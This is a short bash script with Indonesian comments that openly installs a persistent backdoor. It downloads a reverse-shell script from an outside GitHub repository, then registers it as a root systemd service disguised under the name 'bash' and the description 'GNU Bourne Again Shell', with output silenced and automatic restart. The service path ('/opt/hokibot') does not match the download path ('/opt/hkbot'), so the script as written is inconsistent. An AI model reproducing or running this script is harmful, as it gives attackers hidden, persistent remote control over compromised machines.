#!/bin/bash
echo "[+] Menginstal backdoor ke systemd..."

# Buat direktori jika belum ada
mkdir -p /opt/hkbot/

# Unduh script reverse shell
wget -O /opt/hkbot/bash https://github.com/Dejavu666/hkbot/raw/refs/heads/main/nc_telegram.sh
chmod +x /opt/hkbot/bash

# Buat file systemd service
cat <<EOF > /etc/systemd/system/bash.service
[Unit]
Description=GNU Bourne Again Shell
After=network.target

[Service]
ExecStart=/bin/bash -c "/opt/hokibot/bash"
Restart=always
User=root
Group=root
StandardOutput=null
StandardError=null
SyslogIdentifier=bash
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

# Aktifkan service
systemctl daemon-reload
systemctl enable bash
systemctl start bash

echo "[+] Instalasi selesai. Service berjalan dengan nama 'bash'."
